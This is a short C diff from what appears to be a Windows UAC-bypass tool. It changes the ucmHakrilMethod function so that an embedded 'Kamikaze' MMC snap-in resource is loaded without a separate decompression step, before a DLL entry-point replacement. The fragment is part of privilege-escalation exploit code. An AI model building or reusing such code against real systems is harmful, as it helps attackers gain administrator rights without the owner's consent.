@@ -51,10 +51,9 @@ NTSTATUS ucmHakrilMethod(
 {
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
 
-    ULONG DataSize = 0, SnapinSize = 0;
+    ULONG SnapinSize = 0;
     SIZE_T Dummy, MscBufferSize = 0, MscSize = 0, MscBytesIO = 0;
-    PVOID SnapinResource = NULL, SnapinData = NULL, MscBufferPtr = NULL;
-    PVOID ImageBaseAddress = g_hInstance;  
+    PVOID SnapinData = NULL, MscBufferPtr = NULL;
     CHAR *pszMarker;
 
     WCHAR szBuffer[MAX_PATH * 2];
@@ -68,17 +67,11 @@ NTSTATUS ucmHakrilMethod(
         //
         // Decrypt and decompress custom Kamikaze snap-in.
         //
-        SnapinResource = supLdrQueryResourceData(
+        SnapinData = supLdrQueryResourceData(
             KAMIKAZE_ID,
-            ImageBaseAddress,
-            &DataSize);
+            &SnapinSize);
 
-        if (SnapinResource) {
-            SnapinData = g_ctx->DecompressRoutine(KAMIKAZE_ID, SnapinResource, DataSize, &SnapinSize);
-            if (SnapinData == NULL)
-                break;
-        }
-        else
+        if (SnapinData == NULL)
             break;
 
         if (!supReplaceDllEntryPoint(
